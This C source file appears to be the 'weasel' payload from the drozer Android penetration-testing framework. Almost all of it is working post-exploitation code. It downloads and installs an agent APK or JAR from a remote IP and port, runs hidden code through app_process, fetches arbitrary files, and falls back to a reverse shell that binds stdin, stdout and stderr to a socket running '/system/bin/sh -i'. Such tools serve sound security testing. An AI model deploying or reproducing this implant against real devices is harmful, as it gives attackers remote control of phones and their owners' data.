#include "utils.h"

/* Global variables. Yes, it is bad practice. No, I don't care :) */
char *ip;
char *port;
char *dir;


/* Attempt to install a drozer apk */
bool privileged_weasel()
{
    /* Pull down the apk file from HTTP server and place in current folder - retry every 5s upon failure */
    while (!downloadFile(ip, port, "agent.apk", dir))
        sleep(5);
    
    /* Attempt to install drozer */
    const char* pmString = "pm install %s/agent.apk";
    char* pmCommand = malloc(strlen(pmString) - 2 + strlen(dir) + 1);
    sprintf(pmCommand, pmString, dir);
    system(pmCommand);
    
    /* Get SDK version from SystemProperties */
    char sdkVersionStr[4];
    long sdkVersionLong;
    property_get("ro.build.version.sdk", sdkVersionStr, NULL);
    sdkVersionLong = strtol(sdkVersionStr, NULL, 10);

    /* Check if device is running Android 3.0.x or less */
    if (sdkVersionLong <= 11)
    {
        /* Start drozer by sending a broadcast */
        const char* amBroadcast = "am broadcast -a com.mwr.dz.PWN";
        system(amBroadcast);
        debug("weasel", "Starting method - sent broadcast");
    }
    else
    {
         /* Start drozer by invoking the service */
        const char* amService = "am startservice -n com.mwr.dz/.Agent";
        system(amService);
        debug("weasel", "Starting method - invoked service");
    }
    
    return drozerInstalled();
}

/* Attempt to run a limited drozer agent using app_process - undocumented much? :) */
bool sneaky_weasel()
{
    char* fileName = "agent";
    char* execClass = "com.mwr.dz.Agent";
    char* jarFilePath;
    char* odexFilePath;
    char* execPath;

    /* Pull down the jar file from HTTP server and place in current folder - retry every 5s upon failure */
    while (!downloadFile(ip, port, "agent.jar", dir))
            sleep(5);
    
    /* Formulate strings */
    jarFilePath = malloc(snprintf(NULL, 0, "%s/%s.jar", dir, fileName) + 1);
    odexFilePath = malloc(snprintf(NULL, 0, "%s/%s.odex", dir, fileName) + 1);
    sprintf(jarFilePath, "%s/%s.jar", dir, fileName);
    sprintf(odexFilePath, "%s/%s.odex", dir, fileName);
    debug("jarFilePath", jarFilePath);
    debug("odexFilePath", odexFilePath);
    
    /* Remove the current ODEX file if there is one */
    remove(odexFilePath);
    
    /* 
     * ODEX the jar file. This stops the OS from wanting to 
     * cache the dex file which we will certainly not have
     * permission to do. Normally writes the dex to 
     * /data/dalvik-cache/. This function relies heavily on
     * the BOOTCLASSPATH being set.
     */  
    if (odexAPKJAR(jarFilePath, odexFilePath))
        debug("odexAPKJAR", "success");
    else
    {
        debug("odexAPKJAR", "failure");
        return false;
    }
    
    /* Spawn new class using app_process and ip + port as parameters */
    setenv("CLASSPATH", jarFilePath, 1);
    execPath = malloc(snprintf(NULL, 0, "exec app_process %s %s %s %s", dir, execClass, ip, port) + 1);
    sprintf(execPath, "exec app_process %s %s %s %s", dir, execClass, ip, port);
    debug("system()", "Hold thumbs...we are attempting to run it...");
    system(execPath);
    
    /* If this is reached it means that the app image was not replaced with that of agent.jar */
    return false;
}

/* If all the other techniques have failed, send a shell */
bool defeated_weasel()
{
    /* Create socket */
    int s = socket(AF_INET, SOCK_STREAM, 0);
 
    /* Populate details of server */
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(atoi(port));

    /* Connect */
    if (connect(s, (struct sockaddr *) &server, sizeof(struct sockaddr)) != 0)
        return false;

    /* Send the magic header to let the server know that this is a plain shell connection */
    char *magic = "S";
    send(s, magic, strlen(magic), 0);
    
    /* Add current folder to PATH */
    char *standardPath = "/system/bin:/system/xbin";
    char *newPath = malloc(strlen(standardPath) + 1 + strlen(dir) + 1);
    strncpy(newPath, standardPath, strlen(standardPath));
    strcat(newPath, ":");
    strcat(newPath, dir);
    setenv("PATH", newPath, 1);

    /* Connect stdin, stdout and stderr to socket */
    dup2(s, STDIN_FILENO);
    dup2(s, STDOUT_FILENO);
    dup2(s, STDERR_FILENO);

    /* Run shell */
    system("/system/bin/sh -i");

    return true;
}
 
/* usage: weasel <ip> <port>            */
/* usage: weasel <ip> <port> get <file> */

int main(int argc, char** argv)
{
    debug("weasel", "a weasel is born");

    /* Get current directory */
    dir = malloc(snprintf(NULL, 0, "%s", getCurrentDirectory()) + 1);
    sprintf(dir, "%s", getCurrentDirectory());

    /* Check args */
    if (argc == 3)
    {
        debug("weasel", argv[1]);
        debug("weasel", argv[2]);

        /* Assign input to vars */
        ip = malloc(snprintf(NULL, 0, "%s", argv[1]) + 1);
        sprintf(ip, "%s", argv[1]);
        port = malloc(snprintf(NULL, 0, "%s", argv[2]) + 1);
        sprintf(port, "%s", argv[2]);
    }
    else if (argc == 5)
    {
        /* Download a file from HTTP server and place in current folder */
        /* e.g. Download busybox binary */
        debug("weasel", argv[4]);
        downloadFile(argv[1], argv[2], argv[4], dir);
        return 0;
    }
    else
    {
        printf("usage: weasel <ip> <port>\n");
        printf("usage: weasel <ip> <port> get <file>\n");
        __android_log_write(ANDROID_LOG_INFO, "weasel", "incorrect parameters");
        return 0;
    }

    /* Make sure that PATH is set */
    ensureEnvironmentalVarIsSet("PATH");

    /* Make sure that BOOTCLASSPATH is set */
    ensureEnvironmentalVarIsSet("BOOTCLASSPATH");

    /* Make sure that LD_LIBRARY_PATH is set */
    ensureEnvironmentalVarIsSet("LD_LIBRARY_PATH");
    
    /* Bring forth the weasel! */

    /* Create fork for privileged_weasel */
    if (fork() == 0)
    {
        if (privileged_weasel())
            debug("weasel", "[+] The privileged weasel commanded the install of a drozer agent");
        else
            debug("weasel", "[-] Your weasel is not privileged");
    }
    else
    {
        /* Create fork for sneaky_weasel */
        if (fork() == 0)
        {
            if (sneaky_weasel())
                printf("weasel", "[+] Your sneaky weasel has slipped a drozer into your process");
            else
                debug("weasel", "[-] Your weasel is not sneaky");
        }
        else
        {
            /* Ensure that there is always a shell connection running in the parent process */
            while (!defeated_weasel())
            {
                debug("weasel", "[*] Weasel loves eggs but really hates shells! Keep this as a last resort...");
                sleep(5);
            }
        }
    }

    return 0;  
}
